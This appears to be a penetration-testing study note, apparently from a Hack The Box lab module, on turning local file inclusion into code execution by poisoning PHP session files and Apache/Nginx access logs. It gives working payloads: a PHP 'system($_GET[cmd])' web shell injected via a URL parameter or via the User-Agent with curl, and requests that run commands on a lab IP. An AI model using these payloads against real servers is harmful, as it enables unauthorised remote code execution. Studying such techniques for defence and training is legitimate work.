---
description: >-
  Writing PHP code in a field we control that gets logged into a log file (i.e.
  poison/contaminate the log file)
---

# Log Poisoning

For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.

any of the following functions with `Execute` privileges should be vulnerable to these attacks:

<table data-header-hidden><thead><tr><th width="350"></th><th width="143"></th><th width="114"></th><th></th></tr></thead><tbody><tr><td><strong>Function</strong></td><td><strong>Read Content</strong></td><td><strong>Execute</strong></td><td><strong>Remote URL</strong></td></tr><tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr><tr><td><code>include()</code>/<code>include_once()</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><code>require()</code>/<code>require_once()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><strong>NodeJS</strong></td><td></td><td></td><td></td></tr><tr><td><code>res.render()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><strong>Java</strong></td><td></td><td></td><td></td></tr><tr><td><code>import</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr><tr><td><code>include</code></td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table>

### PHP Session Poisoning

* Most PHP webapp uses PHPSESSID cookies
* The cookie can hold user-related data on backend
* The details are stored in session files on back-end
* Session files are located at /var/lib/php/sessions/ (Linux)
* Session files are located at C:\Windows\Temp (windows)
* Name of the file is matched with PHPSESSIONID cookie with sess\_ prefix

To Poison we have to examine PHPSESSID session file and look for data we can control

<figure><img src="https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png" alt=""><figcaption><p><code>nhhv8i0o6ua4g88bkdl9u1fdsd</code></p></figcaption></figure>

```
LFI sesssion file
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

<figure><img src="https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png" alt=""><figcaption><p>Included Example</p></figcaption></figure>

session file contains two values in above example.

`page` value is under our control, as we can control it through the `?language=` parameter

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_sess_rf21ahckiod8299llj499cs8j1
```

<figure><img src="https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png" alt=""><figcaption></figcaption></figure>

the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file

next step is to perform the `poisoning` step by writing PHP code to the session file.

```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_rf21ahckiod8299llj499cs8j1&cmd=id
```

<figure><img src="https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png" alt=""><figcaption></figcaption></figure>

### Server Log Poisoning

* `Apache` and `Nginx` maintain log files( `access.log` and `error.log )`
* `access.log` contains info about all requests including `User-Agent`&#x20;
* As we can control `User-Agent` we can poison server logs
* Once poisoned, we LFI which we need read-access over log
* `Nginx` logs -> low priv can read (www-data)
* `Apache` logs -> high priv only (root / adm groups)
* Old `Apache` -> low priv can read

Apache logs -> /var/log/apache2/   C:\xampp\apache\logs\\

Nginx logs -> /var/log/nginx/   C:\nginx\log\\

If not in those locations then use [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

<figure><img src="https://academy.hackthebox.com/storage/modules/23/rfi_access_log.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://academy.hackthebox.com/storage/modules/23/rfi_repeater_ua.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png" alt=""><figcaption></figcaption></figure>

or curl

```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
```

<figure><img src="https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png" alt=""><figcaption><p>c85ee5082f4c723ace6c0796e3a3db09.txt</p></figcaption></figure>

```
http://64.227.34.226:32308/index.php?language=/var/lib/php/sessions/sess_rf21ahckiod8299llj499cs8j1&cmd=cat%20c85ee5082f4c723ace6c0796e3a3db09.txt
```
